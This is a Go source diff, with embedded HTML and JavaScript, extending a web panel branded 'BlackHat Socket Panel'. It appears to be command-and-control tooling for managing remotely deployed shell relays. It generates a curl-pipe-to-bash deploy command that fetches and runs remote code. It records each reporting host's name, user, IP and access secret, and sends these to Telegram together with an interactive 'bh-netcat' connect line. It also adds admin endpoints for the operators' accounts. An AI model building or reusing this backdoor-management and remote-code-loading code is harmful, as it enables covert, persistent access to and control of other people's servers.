@@ -18,6 +18,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -163,10 +164,13 @@ type portalDB struct {
 }
 
 type portalUser struct {
-	ID          string
-	Username    string
-	DeployToken string
-	CreatedAt   time.Time
+	ID               string
+	Username         string
+	DeployToken      string
+	TelegramBotToken string
+	TelegramChatID   string
+	CreatedAt        time.Time
+	ServerCount      int
 }
 
 type portalServer struct {
@@ -192,6 +196,14 @@ type panelView struct {
 	User          portalUser
 	Servers       []portalServer
 	DeployCommand string
+}
+
+type adminUserRow struct {
+	ID          string    `json:"id"`
+	Username    string    `json:"username"`
+	ServerCount int       `json:"server_count"`
+	HasTelegram bool      `json:"has_telegram"`
+	CreatedAt   time.Time `json:"created_at"`
 }
 
 func main() {
@@ -233,12 +245,16 @@ func main() {
 	mux.HandleFunc("/api/secrets/", s.requireAuth(s.handleSecret))
 	mux.HandleFunc("/api/audit", s.requireAuth(s.handleAudit))
 	mux.HandleFunc("/api/installs", s.requireAuth(s.handleInstalls))
+	mux.HandleFunc("/api/users", s.requireAuth(s.handleAdminUsers))
+	mux.HandleFunc("/api/users/", s.requireAuth(s.handleAdminUser))
 	mux.HandleFunc("/api/install-report", s.handleInstallReport)
 	mux.HandleFunc("/panel/", s.handlePanel)
 	mux.HandleFunc("/panel/login", s.handlePanelLogin)
 	mux.HandleFunc("/panel/register", s.handlePanelRegister)
 	mux.HandleFunc("/panel/logout", s.handlePanelLogout)
 	mux.HandleFunc("/panel/token/rotate", s.handlePanelRotateToken)
+	mux.HandleFunc("/panel/password", s.handlePanelPassword)
+	mux.HandleFunc("/panel/telegram", s.handlePanelTelegram)
 
 	httpServer := &http.Server{
 		Addr:              cfg.ListenAddr,
@@ -454,6 +470,47 @@ func (s *server) handleInstalls(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, http.StatusOK, map[string]any{"installs": records})
 }
 
+func (s *server) handleAdminUsers(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
+		return
+	}
+	users, err := s.portal.adminUsers(r.Context(), 1000)
+	if err != nil {
+		writeJSON(w, http.StatusInternalServerError, apiError{Error: err.Error()})
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]any{"users": users})
+}
+
+func (s *server) handleAdminUser(w http.ResponseWriter, r *http.Request) {
+	path := strings.TrimPrefix(r.URL.Path, "/api/users/")
+	parts := strings.Split(strings.Trim(path, "/"), "/")
+	if len(parts) == 0 || parts[0] == "" {
+		writeJSON(w, http.StatusNotFound, apiError{Error: "not found"})
+		return
+	}
+	id := parts[0]
+	switch {
+	case r.Method == http.MethodDelete && len(parts) == 1:
+		if err := s.portal.deleteUser(r.Context(), id); err != nil {
+			writeJSON(w, http.StatusInternalServerError, apiError{Error: err.Error()})
+			return
+		}
+		s.audit.write(auditEvent{Time: time.Now().UTC(), Actor: s.actor(r), Action: "delete_user", Target: id, IP: clientIP(r)})
+		writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
+	case r.Method == http.MethodPost && len(parts) == 2 && parts[1] == "rotate-token":
+		if err := s.portal.rotateToken(r.Context(), id); err != nil {
+			writeJSON(w, http.StatusInternalServerError, apiError{Error: err.Error()})
+			return
+		}
+		s.audit.write(auditEvent{Time: time.Now().UTC(), Actor: s.actor(r), Action: "rotate_user_token", Target: id, IP: clientIP(r)})
+		writeJSON(w, http.StatusOK, map[string]string{"status": "rotated"})
+	default:
+		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
+	}
+}
+
 func (s *server) handleInstallReport(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
@@ -476,8 +533,11 @@ func (s *server) handleInstallReport(w http.ResponseWriter, r *http.Request) {
 		rec.PublicIP = rec.IP
 	}
 	if rec.Token != "" {
-		if err := s.portal.recordServer(r.Context(), rec); err != nil {
+		u, srv, created, err := s.portal.recordServer(r.Context(), rec)
+		if err != nil {
 			log.Printf("portal record server: %v", err)
+		} else if created {
+			go s.notifyTelegram(u, srv)
 		}
 	}
 	if err := s.installs.write(rec); err != nil {
@@ -567,6 +627,100 @@ func (s *server) handlePanelRotateToken(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 	http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+}
+
+func (s *server) handlePanelPassword(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+		return
+	}
+	u, ok := s.currentUser(r)
+	if !ok {
+		http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+		return
+	}
+	current := r.FormValue("current_password")
+	next := r.FormValue("new_password")
+	if len(next) < 8 {
+		s.renderPanelError(w, r, "New password must be at least 8 characters")
+		return
+	}
+	if err := s.portal.changePassword(r.Context(), u.ID, current, next); err != nil {
+		s.renderPanelError(w, r, err.Error())
+		return
+	}
+	http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+}
+
+func (s *server) handlePanelTelegram(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+		return
+	}
+	u, ok := s.currentUser(r)
+	if !ok {
+		http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+		return
+	}
+	botToken := strings.TrimSpace(r.FormValue("telegram_bot_token"))
+	chatID := strings.TrimSpace(r.FormValue("telegram_chat_id"))
+	if err := s.portal.updateTelegram(r.Context(), u.ID, botToken, chatID); err != nil {
+		s.renderPanelError(w, r, err.Error())
+		return
+	}
+	http.Redirect(w, r, "/panel/", http.StatusSeeOther)
+}
+
+func (s *server) renderPanelError(w http.ResponseWriter, r *http.Request, msg string) {
+	u, ok := s.currentUser(r)
+	if !ok {
+		s.renderPanel(w, panelView{Title: "BlackHat Socket Login", Mode: "login", Error: msg})
+		return
+	}
+	servers, _ := s.portal.serversForUser(r.Context(), u.ID, 1000)
+	s.renderPanel(w, panelView{
+		Title:         "BlackHat Socket Panel",
+		Mode:          "dashboard",
+		Error:         msg,
+		User:          u,
+		Servers:       servers,
+		DeployCommand: fmt.Sprintf(`BH_TOKEN="%s" bash -c "$(curl -fsSL %s/y)"`, u.DeployToken, strings.TrimRight(s.cfg.PublicURL, "/")),
+	})
+}
+
+func (s *server) notifyTelegram(u portalUser, srv portalServer) {
+	if u.TelegramBotToken == "" || u.TelegramChatID == "" {
+		return
+	}
+	text := fmt.Sprintf("BlackHat Socket: new server deployed\nHost: %s\nUser: %s\nIP: %s\nSecret: %s\nConnect: bh-netcat -s \"%s\" -i", srv.Hostname, srv.ServerUser, firstNonEmpty(srv.PublicIP, srv.IP), srv.Secret, srv.Secret)
+	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
+	defer cancel()
+	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", url.PathEscape(u.TelegramBotToken))
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(url.Values{"chat_id": {u.TelegramChatID}, "text": {text}}.Encode()))
+	if err != nil {
+		log.Printf("telegram request: %v", err)
+		return
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	resp, err := s.client.Do(req)
+	if err != nil {
+		log.Printf("telegram send: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode >= 300 {
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
+		log.Printf("telegram send status %s: %s", resp.Status, strings.TrimSpace(string(body)))
+	}
+}
+
+func firstNonEmpty(vals ...string) string {
+	for _, v := range vals {
+		if strings.TrimSpace(v) != "" {
+			return v
+		}
+	}
+	return "-"
 }
 
 func (s *server) renderPanel(w http.ResponseWriter, data panelView) {
@@ -1014,6 +1168,8 @@ func (p *portalDB) migrate() error {
 			password_hash TEXT NOT NULL,
 			deploy_token TEXT NOT NULL UNIQUE,
 			deploy_token_hash TEXT NOT NULL UNIQUE,
+			telegram_bot_token TEXT NOT NULL DEFAULT '',
+			telegram_chat_id TEXT NOT NULL DEFAULT '',
 			created_at TEXT NOT NULL
 		)`,
 		`CREATE TABLE IF NOT EXISTS user_servers (
@@ -1041,6 +1197,14 @@ func (p *portalDB) migrate() error {
 			return err
 		}
 	}
+	for _, stmt := range []string{
+		`ALTER TABLE users ADD COLUMN telegram_bot_token TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE users ADD COLUMN telegram_chat_id TEXT NOT NULL DEFAULT ''`,
+	} {
+		if _, err := p.db.Exec(stmt); err != nil && !strings.Contains(strings.ToLower(err.Error()), "duplicate column") {
+			return err
+		}
+	}
 	return nil
 }
 
@@ -1059,8 +1223,8 @@ func (p *portalDB) createUser(ctx context.Context, username, password string) (p
 	}
 	now := time.Now().UTC()
 	u := portalUser{ID: newID(), Username: username, DeployToken: token, CreatedAt: now}
-	_, err = p.db.ExecContext(ctx, `INSERT INTO users(id, username, password_salt, password_hash, deploy_token, deploy_token_hash, created_at) VALUES(?,?,?,?,?,?,?)`,
-		u.ID, username, salt, passwordHash(password, salt), token, tokenHash(token), now.Format(time.RFC3339Nano))
+	_, err = p.db.ExecContext(ctx, `INSERT INTO users(id, username, password_salt, password_hash, deploy_token, deploy_token_hash, telegram_bot_token, telegram_chat_id, created_at) VALUES(?,?,?,?,?,?,?,?,?)`,
+		u.ID, username, salt, passwordHash(password, salt), token, tokenHash(token), "", "", now.Format(time.RFC3339Nano))
 	if err != nil {
 		if strings.Contains(strings.ToLower(err.Error()), "unique") {
 			return portalUser{}, errors.New("username already exists")
@@ -1074,8 +1238,8 @@ func (p *portalDB) authenticate(ctx context.Context, username, password string) 
 	username = strings.ToLower(strings.TrimSpace(username))
 	var u portalUser
 	var salt, stored, created string
-	err := p.db.QueryRowContext(ctx, `SELECT id, username, password_salt, password_hash, deploy_token, created_at FROM users WHERE username=?`, username).
-		Scan(&u.ID, &u.Username, &salt, &stored, &u.DeployToken, &created)
+	err := p.db.QueryRowContext(ctx, `SELECT id, username, password_salt, password_hash, deploy_token, telegram_bot_token, telegram_chat_id, created_at FROM users WHERE username=?`, username).
+		Scan(&u.ID, &u.Username, &salt, &stored, &u.DeployToken, &u.TelegramBotToken, &u.TelegramChatID, &created)
 	if err != nil {
 		return portalUser{}, errors.New("invalid credentials")
 	}
@@ -1089,8 +1253,8 @@ func (p *portalDB) authenticate(ctx context.Context, username, password string) 
 func (p *portalDB) userByID(ctx context.Context, id string) (portalUser, error) {
 	var u portalUser
 	var created string
-	err := p.db.QueryRowContext(ctx, `SELECT id, username, deploy_token, created_at FROM users WHERE id=?`, id).
-		Scan(&u.ID, &u.Username, &u.DeployToken, &created)
+	err := p.db.QueryRowContext(ctx, `SELECT id, username, deploy_token, telegram_bot_token, telegram_chat_id, created_at FROM users WHERE id=?`, id).
+		Scan(&u.ID, &u.Username, &u.DeployToken, &u.TelegramBotToken, &u.TelegramChatID, &created)
 	if err != nil {
 		return portalUser{}, err
 	}
@@ -1107,14 +1271,40 @@ func (p *portalDB) rotateToken(ctx context.Context, userID string) error {
 	return err
 }
 
-func (p *portalDB) recordServer(ctx context.Context, rec installRecord) error {
-	var userID string
-	err := p.db.QueryRowContext(ctx, `SELECT id FROM users WHERE deploy_token_hash=?`, tokenHash(rec.Token)).Scan(&userID)
+func (p *portalDB) changePassword(ctx context.Context, userID, current, next string) error {
+	var salt, stored string
+	if err := p.db.QueryRowContext(ctx, `SELECT password_salt, password_hash FROM users WHERE id=?`, userID).Scan(&salt, &stored); err != nil {
+		return err
+	}
+	if subtle.ConstantTimeCompare([]byte(stored), []byte(passwordHash(current, salt))) != 1 {
+		return errors.New("current password is incorrect")
+	}
+	newSalt, err := randomToken(18)
 	if err != nil {
 		return err
 	}
+	_, err = p.db.ExecContext(ctx, `UPDATE users SET password_salt=?, password_hash=? WHERE id=?`, newSalt, passwordHash(next, newSalt), userID)
+	return err
+}
+
+func (p *portalDB) updateTelegram(ctx context.Context, userID, botToken, chatID string) error {
+	if len(botToken) > 180 || len(chatID) > 80 {
+		return errors.New("telegram settings are too long")
+	}
+	_, err := p.db.ExecContext(ctx, `UPDATE users SET telegram_bot_token=?, telegram_chat_id=? WHERE id=?`, botToken, chatID, userID)
+	return err
+}
+
+func (p *portalDB) recordServer(ctx context.Context, rec installRecord) (portalUser, portalServer, bool, error) {
+	var userID string
+	err := p.db.QueryRowContext(ctx, `SELECT id FROM users WHERE deploy_token_hash=?`, tokenHash(rec.Token)).Scan(&userID)
+	if err != nil {
+		return portalUser{}, portalServer{}, false, err
+	}
 	now := time.Now().UTC().Format(time.RFC3339Nano)
 	key := fingerprintShort(userID + "|" + rec.Secret + "|" + rec.Hostname + "|" + rec.User)
+	var existing int
+	_ = p.db.QueryRowContext(ctx, `SELECT COUNT(1) FROM user_servers WHERE id=?`, key).Scan(&existing)
 	_, err = p.db.ExecContext(ctx, `INSERT INTO user_servers(id,user_id,time,hostname,server_user,os,arch,kernel,install_path,relay_port,secret,public_ip,ip,updated_at)
 		VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
 		ON CONFLICT(id) DO UPDATE SET
@@ -1122,7 +1312,15 @@ func (p *portalDB) recordServer(ctx context.Context, rec installRecord) error {
 			kernel=excluded.kernel, install_path=excluded.install_path, relay_port=excluded.relay_port, secret=excluded.secret,
 			public_ip=excluded.public_ip, ip=excluded.ip, updated_at=excluded.updated_at`,
 		key, userID, rec.Time.Format(time.RFC3339Nano), rec.Hostname, rec.User, rec.OS, rec.Arch, rec.Kernel, rec.InstallPath, rec.RelayPort, rec.Secret, rec.PublicIP, rec.IP, now)
-	return err
+	if err != nil {
+		return portalUser{}, portalServer{}, false, err
+	}
+	u, err := p.userByID(ctx, userID)
+	if err != nil {
+		return portalUser{}, portalServer{}, false, err
+	}
+	srv := portalServer{ID: key, Time: rec.Time, Hostname: rec.Hostname, ServerUser: rec.User, OS: rec.OS, Arch: rec.Arch, Kernel: rec.Kernel, InstallPath: rec.InstallPath, RelayPort: rec.RelayPort, Secret: rec.Secret, PublicIP: rec.PublicIP, IP: rec.IP, UpdatedAt: time.Now().UTC()}
+	return u, srv, existing == 0, nil
 }
 
 func (p *portalDB) serversForUser(ctx context.Context, userID string, limit int) ([]portalServer, error) {
@@ -1144,6 +1342,34 @@ func (p *portalDB) serversForUser(ctx context.Context, userID string, limit int)
 		out = append(out, s)
 	}
 	return out, rows.Err()
+}
+
+func (p *portalDB) adminUsers(ctx context.Context, limit int) ([]adminUserRow, error) {
+	rows, err := p.db.QueryContext(ctx, `SELECT u.id,u.username,u.created_at,u.telegram_bot_token,u.telegram_chat_id,COUNT(s.id)
+		FROM users u LEFT JOIN user_servers s ON s.user_id=u.id
+		GROUP BY u.id,u.username,u.created_at,u.telegram_bot_token,u.telegram_chat_id
+		ORDER BY u.created_at DESC LIMIT ?`, limit)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	out := []adminUserRow{}
+	for rows.Next() {
+		var row adminUserRow
+		var created, bot, chat string
+		if err := rows.Scan(&row.ID, &row.Username, &created, &bot, &chat, &row.ServerCount); err != nil {
+			return nil, err
+		}
+		row.CreatedAt, _ = time.Parse(time.RFC3339Nano, created)
+		row.HasTelegram = bot != "" && chat != ""
+		out = append(out, row)
+	}
+	return out, rows.Err()
+}
+
+func (p *portalDB) deleteUser(ctx context.Context, id string) error {
+	_, err := p.db.ExecContext(ctx, `DELETE FROM users WHERE id=?`, id)
+	return err
 }
 
 func passwordHash(password, salt string) string {
@@ -1272,11 +1498,12 @@ form{display:grid;gap:10px}label{display:grid;gap:5px;color:var(--muted)}input,t
 <div class="metric"><span>Uptime</span><b id="mUptime" style="font-size:15px">-</b></div>
 </aside>
 <section class="panel">
-<div class="toolbar"><div class="tabs"><button class="active" data-view="peers">Peers</button><button data-view="installs">Installs</button><button data-view="secrets">Secrets</button><button data-view="audit">Audit</button></div><button class="btn" id="refresh">Refresh</button></div>
+<div class="toolbar"><div class="tabs"><button class="active" data-view="peers">Peers</button><button data-view="users">Users</button><button data-view="installs">Installs</button><button data-view="secrets">Secrets</button><button data-view="audit">Audit</button></div><button class="btn" id="refresh">Refresh</button></div>
 <div id="viewPeers">
 <div class="toolbar"><select id="peerFilter"><option value="">All</option><option value="listening">Listening</option><option value="connected">Connected</option><option value="bad">Bad Auth</option></select></div>
 <div style="overflow:auto"><table><thead><tr><th>ID</th><th>Address</th><th>State</th><th>Server</th><th>Client</th><th>Traffic</th><th></th></tr></thead><tbody id="peerRows"></tbody></table></div>
 </div>
+<div id="viewUsers" class="hidden"><div style="overflow:auto"><table><thead><tr><th>User</th><th>Servers</th><th>Telegram</th><th>Created</th><th></th></tr></thead><tbody id="userRows"></tbody></table></div></div>
 <div id="viewInstalls" class="hidden"><div style="overflow:auto"><table><thead><tr><th>Time</th><th>Host</th><th>System</th><th>Secret</th><th>Path</th><th>Port</th><th>IP</th></tr></thead><tbody id="installRows"></tbody></table></div></div>
 <div id="viewSecrets" class="hidden">
 <div class="grid">
@@ -1299,12 +1526,15 @@ async function loadHealth(){try{const h=await api('/api/health');$('#healthDot')
 async function loadStats(){try{const s=await api('/api/stats');$('#mListening').textContent=s.listening;$('#mConnected').textContent=s.connected;$('#mBad').textContent=s.gs_bad_auth;$('#mUptime').textContent=s.uptime||'-'}catch(e){}}
 async function loadPeers(){const f=$('#peerFilter').value;const j=await api('/api/peers'+(f?'?filter='+encodeURIComponent(f):''));$('#peerRows').innerHTML=j.peers.map(p=>'<tr><td>'+p.id+'</td><td><code>'+esc(p.address)+'</code><div class="muted">'+esc(p.gs_id)+' '+esc(p.secret_ref||'')+'</div></td><td class="state '+esc(p.state)+'">'+esc(p.state)+'<div class="muted">'+esc(p.age)+'</div></td><td>'+esc(p.server)+'</td><td>'+esc(p.client||'-')+'</td><td>'+esc(p.traffic||'-')+'<div class="muted">'+esc(p.bps||'')+'</div></td><td><button class="btn bad" onclick="killPeer(\''+esc(p.address)+'\')">Kill</button></td></tr>').join('')||'<tr><td colspan="7" class="muted">No peers</td></tr>'}
 async function killPeer(address){if(!confirm('Disconnect '+address+'?'))return;await api('/api/peers/kill',{method:'POST',body:JSON.stringify({address})});await refresh()}
+async function loadUsers(){const j=await api('/api/users');$('#userRows').innerHTML=j.users.map(u=>'<tr><td>'+esc(u.username)+'<div class="muted"><code>'+esc(u.id)+'</code></div></td><td>'+esc(u.server_count)+'</td><td>'+esc(u.has_telegram?'enabled':'-')+'</td><td>'+esc(u.created_at)+'</td><td><button class="btn" onclick="rotateUserToken(&quot;'+esc(u.id)+'&quot;)">Rotate token</button> <button class="btn bad" onclick="deleteUser(&quot;'+esc(u.id)+'&quot;,&quot;'+esc(u.username)+'&quot;)">Delete</button></td></tr>').join('')||'<tr><td colspan="5" class="muted">No users</td></tr>'}
+async function rotateUserToken(id){if(!confirm('Rotate deploy token for this user?'))return;await api('/api/users/'+id+'/rotate-token',{method:'POST'});await loadUsers()}
+async function deleteUser(id,name){if(!confirm('Delete user '+name+' and all server records?'))return;await api('/api/users/'+id,{method:'DELETE'});await loadUsers()}
 async function loadInstalls(){const j=await api('/api/installs');$('#installRows').innerHTML=j.installs.map(i=>'<tr><td>'+esc(i.time)+'</td><td>'+esc(i.hostname||'-')+'<div class="muted">'+esc(i.user||'')+'</div></td><td>'+esc(i.os||'-')+' '+esc(i.arch||'')+'<div class="muted">'+esc(i.kernel||'')+'</div></td><td><code>'+esc(i.secret||'-')+'</code></td><td><code>'+esc(i.install_path||'')+'</code></td><td>'+esc(i.relay_port||'-')+'</td><td>'+esc(i.ip||'-')+'</td></tr>').join('')||'<tr><td colspan="7" class="muted">No installs reported yet</td></tr>'}
 async function loadSecrets(){const j=await api('/api/secrets');$('#secretRows').innerHTML=j.secrets.map(s=>'<tr><td>'+esc(s.name)+'<div class="muted">'+esc(s.notes||'')+'</div></td><td>'+esc(s.owner)+'</td><td><code>'+esc(s.secret||'-')+'</code></td><td><code>'+esc(s.fingerprint)+'</code></td><td>'+esc(s.status)+'</td><td><select onchange="setSecret(\''+esc(s.id)+'\',this.value)"><option '+(s.status==='active'?'selected':'')+'>active</option><option '+(s.status==='rotating'?'selected':'')+'>rotating</option><option '+(s.status==='revoked'?'selected':'')+'>revoked</option></select></td></tr>').join('')||'<tr><td colspan="6" class="muted">No secret records</td></tr>'}
 async function setSecret(id,status){await api('/api/secrets/'+id,{method:'PATCH',body:JSON.stringify({status})});await loadSecrets()}
 async function loadAudit(){const j=await api('/api/audit');$('#auditRows').innerHTML=j.events.map(e=>'<tr><td>'+esc(e.time)+'</td><td>'+esc(e.actor)+'</td><td>'+esc(e.action)+'</td><td><code>'+esc(e.target||'')+'</code></td><td>'+esc(e.details||'')+'</td></tr>').join('')||'<tr><td colspan="5" class="muted">No audit events</td></tr>'}
-async function refresh(){await loadHealth();await loadStats();if(view==='peers')await loadPeers();if(view==='installs')await loadInstalls();if(view==='secrets')await loadSecrets();if(view==='audit')await loadAudit()}
-$$('.tabs button').forEach(b=>b.onclick=()=>{view=b.dataset.view;$$('.tabs button').forEach(x=>x.classList.toggle('active',x===b));$('#viewPeers').classList.toggle('hidden',view!=='peers');$('#viewInstalls').classList.toggle('hidden',view!=='installs');$('#viewSecrets').classList.toggle('hidden',view!=='secrets');$('#viewAudit').classList.toggle('hidden',view!=='audit');refresh()});
+async function refresh(){await loadHealth();await loadStats();if(view==='peers')await loadPeers();if(view==='users')await loadUsers();if(view==='installs')await loadInstalls();if(view==='secrets')await loadSecrets();if(view==='audit')await loadAudit()}
+$$('.tabs button').forEach(b=>b.onclick=()=>{view=b.dataset.view;$$('.tabs button').forEach(x=>x.classList.toggle('active',x===b));$('#viewPeers').classList.toggle('hidden',view!=='peers');$('#viewUsers').classList.toggle('hidden',view!=='users');$('#viewInstalls').classList.toggle('hidden',view!=='installs');$('#viewSecrets').classList.toggle('hidden',view!=='secrets');$('#viewAudit').classList.toggle('hidden',view!=='audit');refresh()});
 $('#refresh').onclick=refresh;$('#peerFilter').onchange=loadPeers;
 $('#secretForm').onsubmit=async e=>{e.preventDefault();const fd=new FormData(e.target);const res=await api('/api/secrets',{method:'POST',body:JSON.stringify(Object.fromEntries(fd.entries()))});$('#secretOnce').classList.remove('hidden');$('#secretOnce').innerHTML='<b>Copy now. This secret is shown once:</b><br><code>'+esc(res.secret)+'</code>';e.target.reset();await loadSecrets()};
 refresh();setInterval(refresh,10000);
@@ -1319,47 +1549,32 @@ const panelHTML = `<!doctype html>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>{{.Title}}</title>
 <style>
-:root{color-scheme:dark;--bg:#0b0f14;--panel:#151b23;--line:#2b3847;--text:#eef4f7;--muted:#9aa8b2;--ok:#18c29c;--gold:#d9a441;--bad:#e56b6f}
-*{box-sizing:border-box}body{margin:0;background:#0b0f14;color:var(--text);font:14px/1.5 ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
-main{width:min(1180px,calc(100% - 32px));margin:0 auto;padding:28px 0 48px}header{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:24px}.brand{font-weight:850;font-size:18px}.nav{display:flex;gap:10px;align-items:center}.nav a,.btn,button,input{border:1px solid var(--line);border-radius:8px;background:#202832;color:var(--text);padding:9px 11px;font:inherit}.nav a{color:var(--muted);text-decoration:none}.btn.primary,button.primary{background:var(--ok);border-color:var(--ok);color:#04110d;font-weight:800}.panel{border:1px solid var(--line);border-radius:8px;background:var(--panel);padding:18px;margin-bottom:16px}.grid{display:grid;grid-template-columns:380px 1fr;gap:16px}.forms{display:grid;gap:16px}form{display:grid;gap:10px}label{display:grid;gap:5px;color:var(--muted)}input{width:100%}.error{border-color:#7d272d;background:#3b1518;color:#ffbec2}.muted{color:var(--muted)}.cmd{position:relative;border:1px solid #20303d;border-radius:8px;background:#071015;margin-top:10px;overflow:hidden}.cmd pre{margin:0;padding:54px 14px 14px;overflow:auto;color:#d9fff3;font:13px/1.65 ui-monospace,SFMono-Regular,Menlo,monospace}.copy{position:absolute;top:10px;right:10px;min-width:74px}table{width:100%;border-collapse:collapse}th,td{text-align:left;border-bottom:1px solid var(--line);padding:10px 8px;vertical-align:top}th{color:var(--muted);font-size:12px;text-transform:uppercase}td code{font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#d9fff3;overflow-wrap:anywhere}.secret{max-width:250px}.actions{display:flex;gap:8px;flex-wrap:wrap}h1,h2{margin:0 0 12px}h1{font-size:30px}h2{font-size:18px}.metric{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px}.metric div{border:1px solid var(--line);border-radius:8px;padding:12px;background:#10161d}.metric b{font-size:24px;display:block}
-@media(max-width:900px){.grid{grid-template-columns:1fr}.metric{grid-template-columns:1fr}header{align-items:flex-start;flex-direction:column}}
+:root{color-scheme:dark;--bg:#090d12;--panel:#151c24;--panel2:#10161d;--line:#2b3948;--text:#eef4f7;--muted:#9aa8b2;--ok:#18c29c;--gold:#d9a441;--bad:#e56b6f;--blue:#6da7ff}
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:linear-gradient(120deg,rgba(24,194,156,.08),transparent 35%,rgba(217,164,65,.06)),var(--bg);color:var(--text);font:14px/1.5 ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+main{width:min(1240px,calc(100% - 32px));margin:0 auto;padding:28px 0 48px}header{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:24px}.brand{display:flex;align-items:center;gap:10px;font-weight:850;font-size:18px}.mark{display:grid;place-items:center;width:38px;height:38px;border:1px solid rgba(24,194,156,.5);border-radius:8px;color:var(--ok);background:rgba(24,194,156,.1)}.nav{display:flex;gap:10px;align-items:center;flex-wrap:wrap}.nav a,.btn,button,input{border:1px solid var(--line);border-radius:8px;background:#202832;color:var(--text);padding:9px 11px;font:inherit}.nav a{color:var(--muted);text-decoration:none}.btn.primary,button.primary{background:var(--ok);border-color:var(--ok);color:#04110d;font-weight:800}.panel{border:1px solid var(--line);border-radius:8px;background:linear-gradient(180deg,rgba(21,28,36,.98),rgba(13,18,24,.98));padding:18px;margin-bottom:16px;box-shadow:0 18px 60px rgba(0,0,0,.2)}.login-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}.dashboard-grid{display:grid;grid-template-columns:minmax(0,1.25fr) minmax(320px,.75fr);gap:16px}.settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}form{display:grid;gap:10px}label{display:grid;gap:5px;color:var(--muted)}input{width:100%}.error{border-color:#7d272d;background:#3b1518;color:#ffbec2}.muted{color:var(--muted)}.cmd{position:relative;border:1px solid #20303d;border-radius:8px;background:#071015;margin-top:10px;overflow:hidden}.cmd pre{margin:0;padding:54px 14px 14px;overflow:auto;color:#d9fff3;font:13px/1.65 ui-monospace,SFMono-Regular,Menlo,monospace}.copy{position:absolute;top:10px;right:10px;min-width:74px}.metric{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px}.metric div{border:1px solid var(--line);border-radius:8px;padding:13px;background:var(--panel2)}.metric span{color:var(--muted);font-size:12px;text-transform:uppercase}.metric b{font-size:26px;display:block;margin-top:4px}table{width:100%;border-collapse:collapse}th,td{text-align:left;border-bottom:1px solid var(--line);padding:10px 8px;vertical-align:top}th{color:var(--muted);font-size:12px;text-transform:uppercase}td code{font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#d9fff3;overflow-wrap:anywhere}.secret{max-width:260px}h1,h2,h3{margin:0 0 12px}h1{font-size:34px}h2{font-size:19px}h3{font-size:15px}.pill{display:inline-flex;border:1px solid var(--line);border-radius:8px;padding:5px 8px;color:var(--muted);font-size:12px}.section-title{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:10px}.server-empty{padding:26px;text-align:center;color:var(--muted)}
+@media(max-width:940px){.login-grid,.dashboard-grid,.settings-grid{grid-template-columns:1fr}.metric{grid-template-columns:1fr}header{align-items:flex-start;flex-direction:column}}
 </style>
 </head>
 <body>
 <main>
-<header><div class="brand">BlackHat Socket Panel</div><div class="nav">{{if eq .Mode "dashboard"}}<span class="muted">{{.User.Username}}</span><a href="/panel/logout">Logout</a>{{end}}</div></header>
+<header><div class="brand"><span class="mark">BH</span><span>BlackHat Socket Panel</span></div><div class="nav">{{if eq .Mode "dashboard"}}<span class="pill">{{.User.Username}}</span><a href="/panel/logout">Logout</a>{{end}}</div></header>
 {{if .Error}}<div class="panel error">{{.Error}}</div>{{end}}
 {{if ne .Mode "dashboard"}}
-<div class="grid">
-<section class="panel">
-<h1>Login</h1>
-<form method="post" action="/panel/login"><label>Username<input name="username" autocomplete="username" required></label><label>Password<input name="password" type="password" autocomplete="current-password" required></label><button class="primary">Login</button></form>
-</section>
-<section class="panel">
-<h1>Register</h1>
-<p class="muted">Create an employee account. Your deploy token will be generated automatically.</p>
-<form method="post" action="/panel/register"><label>Username<input name="username" autocomplete="username" required></label><label>Password<input name="password" type="password" autocomplete="new-password" minlength="8" required></label><button class="primary">Create account</button></form>
-</section>
+<div class="login-grid">
+<section class="panel"><h1>Login</h1><p class="muted">Open your private server list and deploy token.</p><form method="post" action="/panel/login"><label>Username<input name="username" autocomplete="username" required></label><label>Password<input name="password" type="password" autocomplete="current-password" required></label><button class="primary">Login</button></form></section>
